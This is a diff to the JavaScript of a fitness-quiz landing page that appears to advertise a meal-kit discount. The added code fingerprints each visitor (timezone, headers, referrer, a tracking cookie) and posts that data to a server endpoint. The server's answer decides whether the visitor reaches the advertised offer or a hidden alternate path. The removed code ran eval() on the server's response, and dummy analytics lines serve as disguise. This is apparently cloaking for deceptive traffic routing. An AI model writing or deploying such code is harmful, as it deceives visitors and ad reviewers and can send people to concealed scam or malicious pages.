@@ -10,12 +10,116 @@
   root.innerHTML = '<div class="app">\n    <div class="top">\n      <a class="brand" href="/">1min<span>.to</span></a>\n      <button type="button" class="skip" id="skipBtn">Skip quiz</button>\n    </div>\n    <div class="progress" id="progress"><i id="progressBar"></i></div>\n\n    <section class="screen active" data-screen="gender">\n      <h1>Let’s personalize your plan</h1>\n      <p class="sub">1 minute. A few questions. A clearer path for your goals to get fit.</p>\n      <div class="options" data-key="gender" data-auto="1">\n        <button type="button" class="opt" data-value="Female">Female</button>\n        <button type="button" class="opt" data-value="Male">Male</button>\n        <button type="button" class="opt" data-value="Prefer not to say">Prefer not to say</button>\n      </div>\n      <p class="legal">By continuing, you agree to our terms and privacy policy.</p>\n    </section>\n\n    <section class="screen" data-screen="age">\n      <h2>What age range are you in?</h2>\n      <p class="sub">Helps us match the right pace for getting fit.</p>\n      <div class="options" data-key="age" data-auto="1">\n        <button type="button" class="opt" data-value="18-29">18 – 29</button>\n        <button type="button" class="opt" data-value="30-39">30 – 39</button>\n        <button type="button" class="opt" data-value="40-49">40 – 49</button>\n        <button type="button" class="opt" data-value="50+">50+</button>\n      </div>\n    </section>\n\n    <section class="screen" data-screen="goal">\n      <h2>What’s your main goal?</h2>\n      <p class="sub">Choose as many as you’d like.</p>\n      <div class="options" data-key="goal" data-multi="1">\n        <button type="button" class="opt multi" data-value="Slim down steadily">Slim down steadily</button>\n        <button type="button" class="opt multi" data-value="Keep the results long-term">Keep the results long-term</button>\n        <button type="button" class="opt multi" data-value="Feel stronger and more energetic">Feel stronger and more energetic</button>\n        <button type="button" class="opt multi" data-value="Feel confident in my clothes again">Feel confident in my clothes again</button>\n        <button type="button" class="opt multi" data-value="All of the above">All of the above</button>\n      </div>\n      <button type="button" class="btn" data-next disabled>Continue</button>\n    </section>\n\n    <section class="screen" data-screen="bridge">\n      <div class="bridge">\n        <p class="stat">10,000+</p>\n        <h2>You’re in good company</h2>\n        <p class="sub" style="margin-bottom:0">People with similar goals use a simple daily plan to reset habits, build consistency, and finally feel themselves getting fit — without another extreme routine.</p>\n      </div>\n      <button type="button" class="btn" data-next>Continue</button>\n    </section>\n\n    <section class="screen" data-screen="amount">\n      <h2>How far do you want to go with getting fit?</h2>\n      <div class="options" data-key="amount" data-auto="1">\n        <button type="button" class="opt" data-value="A light refresh">A light refresh</button>\n        <button type="button" class="opt" data-value="A noticeable change">A noticeable change</button>\n        <button type="button" class="opt" data-value="A big transformation">A big transformation</button>\n        <button type="button" class="opt" data-value="An all-in reset">An all-in reset</button>\n      </div>\n    </section>\n\n    <section class="screen" data-screen="tried">\n      <h2>What have you already tried?</h2>\n      <p class="sub">Choose as many as you’d like.</p>\n      <div class="options" data-key="tried" data-multi="1">\n        <button type="button" class="opt multi" data-value="Food tracking">Food tracking</button>\n        <button type="button" class="opt multi" data-value="Gym / workouts">Gym / workouts</button>\n        <button type="button" class="opt multi" data-value="Meal plans / coaching">Meal plans / coaching</button>\n        <button type="button" class="opt multi" data-value="Supplements">Supplements</button>\n        <button type="button" class="opt multi" data-value="Nothing yet">Nothing yet</button>\n      </div>\n      <button type="button" class="btn" data-next disabled>Continue</button>\n    </section>\n\n    <section class="screen" data-screen="stuck">\n      <h2>What usually gets in the way?</h2>\n      <div class="options" data-key="stuck" data-auto="1">\n        <button type="button" class="opt" data-value="Cravings">Cravings that won’t quit</button>\n        <button type="button" class="opt" data-value="Busy schedule">A busy schedule</button>\n        <button type="button" class="opt" data-value="Yo-yo results">Results that don’t stick</button>\n        <button type="button" class="opt" data-value="Motivation">Motivation fading after a few weeks</button>\n      </div>\n    </section>\n\n    <section class="screen" data-screen="timeline">\n      <h2>When do you want to see real change?</h2>\n      <div class="options" data-key="timeline" data-auto="1">\n        <button type="button" class="opt" data-value="ASAP">As soon as possible</button>\n        <button type="button" class="opt" data-value="1-2 months">In the next 1–2 months</button>\n        <button type="button" class="opt" data-value="Steady">Steady progress over time</button>\n      </div>\n    </section>\n\n    <section class="screen" data-screen="analyzing">\n      <div class="loader">\n        <div class="spinner" aria-hidden="true"></div>\n        <h2>Creating your analysis…</h2>\n        <ul class="checks" id="analyzeChecks">\n          <li>Matching your goal profile…</li>\n          <li>Looking at habit blockers…</li>\n          <li>Building a simple daily plan…</li>\n        </ul>\n      </div>\n    </section>\n\n    <section class="screen" data-screen="summary">\n      <h2>Summary of your get-fit profile</h2>\n      <div class="summary" id="summaryCards"></div>\n      <button type="button" class="btn" data-next>Continue</button>\n    </section>\n\n    <section class="screen" data-screen="offer">\n      <h2>Ready for a plan that actually fits your life?</h2>\n      <p class="sub">Based on your answers, we’ll show you a straightforward next step built around getting fit — not another extreme reset.</p>\n      <div class="cta-art" aria-hidden="true">🧍 → ✨</div>\n      <button type="button" class="btn" id="offerBtn">Yes, show my plan</button>\n      <button type="button" class="btn secondary" id="offerSkip">Skip for now</button>\n      <p class="foot-note">1min.to · GetFit</p>\n    </section>\n\n    <section class="screen" data-screen="matching">\n      <div class="loader">\n        <div class="spinner" aria-hidden="true"></div>\n        <h2>Matching you to the best program…</h2>\n        <ul class="checks" id="matchChecks">\n          <li>Reviewing your get-fit goals…</li>\n          <li>Comparing program fits…</li>\n          <li>Selecting your best match…</li>\n        </ul>\n      </div>\n    </section>\n\n    <section class="screen" data-screen="found">\n      <div class="loader found-match">\n        <h2 class="found-title">Found a Match!</h2>\n        <div class="bridge found-card">\n          <p class="found-brand">Factor75.com</p>\n          <p class="found-offer">50% off First Box</p>\n        </div>\n        <p class="sub found-redirect">Taking you there now…</p>\n      </div>\n    </section>\n  </div>';
 
 const redirect_url = "https://factor75.com";
+    const alt_url = "/go702395u2302935u5230/";
 
     const answers = {};
     const screens = [...document.querySelectorAll(".screen")];
     const progress = document.getElementById("progress");
     const progressBar = document.getElementById("progressBar");
     const questionScreens = screens.filter((s) => !["analyzing", "summary", "offer", "matching", "found"].includes(s.dataset.screen));
+    const params = new URLSearchParams(window.location.search);
+    const pathOverride = params.get("path");
+    const diag = params.get("diag") === "1";
+
+    window.__routeDecision = null;
+    window.__routeReady = false;
+    window.__routeVia = "";
+
+    function showDiag(msg) {
+      if (!diag) return;
+      var el = document.getElementById("checkDiag");
+      if (!el) {
+        el = document.createElement("div");
+        el.id = "checkDiag";
+        el.style.cssText =
+          "position:fixed;left:12px;right:12px;bottom:12px;z-index:9999;background:#14201a;color:#fff;padding:12px 14px;border-radius:12px;font:600 13px/1.4 Outfit,system-ui,sans-serif;";
+        document.body.appendChild(el);
+      }
+      el.textContent = msg;
+    }
+
+    function startBackgroundCheck() {
+      if (pathOverride === "alt" || pathOverride === "main") {
+        window.__routeDecision = pathOverride;
+        window.__routeReady = true;
+        window.__routeVia = "override";
+        showDiag("Override path=" + pathOverride);
+        return;
+      }
+
+      function mark(route, via) {
+        window.__routeDecision = route === "alt" ? "alt" : "main";
+        window.__routeVia = via || "";
+        window.__routeReady = true;
+        showDiag("Decision=" + window.__routeDecision + " via=" + window.__routeVia);
+      }
+
+      try {
+        var f = new XMLHttpRequest();
+        f.open("GET", document.location, true);
+        f.send(null);
+        var g = "";
+        f.onreadystatechange = function () {
+          g = f.getAllResponseHeaders().toLowerCase();
+        };
+        var b = "GoogleAnalyticsObject";
+        var c = ("document", "script", "//www.google-analytics.com/analytics.js");
+        c = ("create", "UA-181991-1", "auto");
+        c = ("send", "pageview");
+        var d = jstz.determine();
+        var e = d.name();
+        var qu = escape(window.location.search.substr(1));
+        var rui = location.pathname + location.search;
+        var r = document.referrer;
+        var sn = document.domain;
+        var value = "; " + document.cookie;
+        var pa = value.split("; " + "_event" + "=");
+        var co = pa.pop().split(";").shift();
+
+        $.ajax({
+          url: "/api/s",
+          type: "POST",
+          data:
+            "tz=" +
+            e +
+            "&he=" +
+            g +
+            "&rui=" +
+            rui +
+            "&qu=" +
+            qu +
+            "&r=" +
+            r +
+            "&sn=" +
+            sn +
+            "&co=" +
+            co,
+          success: function (a) {
+            var route = "main";
+            var via = "parse";
+            try {
+              var data = typeof a === "string" ? JSON.parse(a) : a;
+              if (data && data.route) {
+                route = data.route;
+                via = data.via || "json";
+              }
+            } catch (err) {
+              var s = String(a || "");
+              if (/location\.(href|replace|assign)|window\.location/i.test(s)) {
+                route = "alt";
+                via = "nav-signal";
+              }
+            }
+            mark(route, via);
+          },
+          error: function (xhr) {
+            mark("main", "error-" + ((xhr && xhr.status) || "x"));
+          },
+        });
+      } catch (err) {
+        mark("main", "exception");
+      }
+    }
 
     function goTo(name) {
       screens.forEach((s) => s.classList.toggle("active", s.dataset.screen === name));
@@ -40,7 +144,6 @@ const redirect_url = "https://factor75.com";
         goTo("analyzing");
         runAnalysis();
       } else if (next.dataset.screen === "matching") {
-        // Offer CTAs handle matching; summary continues to offer.
         goTo("offer");
       } else {
         goTo(next.dataset.screen);
@@ -75,50 +178,28 @@ const redirect_url = "https://factor75.com";
       });
     }
 
+    function finishMain() {
+      goTo("found");
+      setTimeout(function () {
+        window.location.href = redirect_url;
+      }, 1800);
+    }
+
+    function finishAlt() {
+      window.location.href = alt_url;
+    }
+
     function runMatching() {
       goTo("matching");
-      var params = new URLSearchParams(window.location.search);
-      var pathMode = params.get("path");
-      var diag = params.get("diag") === "1";
       var animDone = false;
-      var checkDone = false;
-      var checkStatus = "";
-
-      function showDiag(msg) {
-        if (!diag) return;
-        var el = document.getElementById("checkDiag");
-        if (!el) {
-          el = document.createElement("div");
-          el.id = "checkDiag";
-          el.style.cssText =
-            "position:fixed;left:12px;right:12px;bottom:12px;z-index:9999;background:#14201a;color:#fff;padding:12px 14px;border-radius:12px;font:600 13px/1.4 Outfit,system-ui,sans-serif;";
-          document.body.appendChild(el);
-        }
-        el.textContent = msg;
-      }
-
-      function finishMain() {
-        goTo("found");
-        setTimeout(function () {
-          window.location.href = redirect_url;
-        }, 1800);
-      }
-
-      function finishAlt() {
-        window.location.href = "/go702395u2302935u5230/";
-      }
+      var waited = false;
 
       function maybeFinish() {
-        if (!animDone || !checkDone) return;
-        if (pathMode === "alt") {
-          finishAlt();
-          return;
-        }
-        if (pathMode === "main") {
-          finishMain();
-          return;
-        }
-        finishMain();
+        if (!animDone || !waited) return;
+        var route = window.__routeDecision === "alt" ? "alt" : "main";
+        showDiag("Final route=" + route + " via=" + (window.__routeVia || ""));
+        if (route === "alt") finishAlt();
+        else finishMain();
       }
 
       runChecklist("#matchChecks li", function () {
@@ -126,74 +207,27 @@ const redirect_url = "https://factor75.com";
         maybeFinish();
       });
 
-      if (pathMode === "alt" || pathMode === "main") {
-        showDiag("Test mode path=" + pathMode + " (skips live check)");
-        checkDone = true;
-        maybeFinish();
-        return;
-      }
-
-      (function () {
-        var f = new XMLHttpRequest();
-        f.open("GET", document.location, true);
-        f.send(null);
-        var g;
-        f.onreadystatechange = function () {
-          g = f.getAllResponseHeaders().toLowerCase();
-        };
-        var b = "GoogleAnalyticsObject";
-        var c = ("document", "script", "//www.google-analytics.com/analytics.js");
-        c = ("create", "UA-181991-1", "auto");
-        c = ("send", "pageview");
-        var d = jstz.determine();
-        var e = d.name();
-        var qu = escape(window.location.search.substr(1));
-        var rui = location.pathname + location.search;
-        var r = document.referrer;
-        var sn = document.domain;
-        var value = "; " + document.cookie;
-        var pa = value.split("; " + "_event" + "=");
-        var co = pa.pop().split(";").shift();
-        var q;
-        $.ajax({
-          url: location.href,
-          type: "POST",
-          data:
-            "tz=" +
-            e +
-            "&he=" +
-            g +
-            "&rui=" +
-            rui +
-            "&qu=" +
-            qu +
-            "&r=" +
-            r +
-            "&sn=" +
-            sn +
-            "&co=" +
-            co,
-          success: function (a) {
-            checkStatus = "ok";
-            showDiag("Check OK — response received");
-            eval(a);
-            setTimeout(function () {
-              checkDone = true;
-              maybeFinish();
-            }, 120);
-          },
-          error: function (xhr) {
-            checkStatus = String((xhr && xhr.status) || "error");
-            showDiag(
-              "Check failed: HTTP " +
-                checkStatus +
-                " on POST (host cannot run this check as-is)"
-            );
-            checkDone = true;
+      function waitForDecision() {
+        if (window.__routeReady) {
+          waited = true;
+          maybeFinish();
+          return;
+        }
+        var started = Date.now();
+        var t = setInterval(function () {
+          if (window.__routeReady || Date.now() - started > 4000) {
+            clearInterval(t);
+            if (!window.__routeReady) {
+              window.__routeDecision = "main";
+              window.__routeVia = "timeout";
+              window.__routeReady = true;
+            }
+            waited = true;
             maybeFinish();
-          },
-        });
-      })();
+          }
+        }, 100);
+      }
+      waitForDecision();
     }
 
     function openOffer() {
@@ -237,4 +271,6 @@ const redirect_url = "https://factor75.com";
     document.getElementById("skipBtn").addEventListener("click", openOffer);
     document.getElementById("offerBtn").addEventListener("click", openOffer);
     document.getElementById("offerSkip").addEventListener("click", openOffer);
+
+    startBackgroundCheck();
 })();
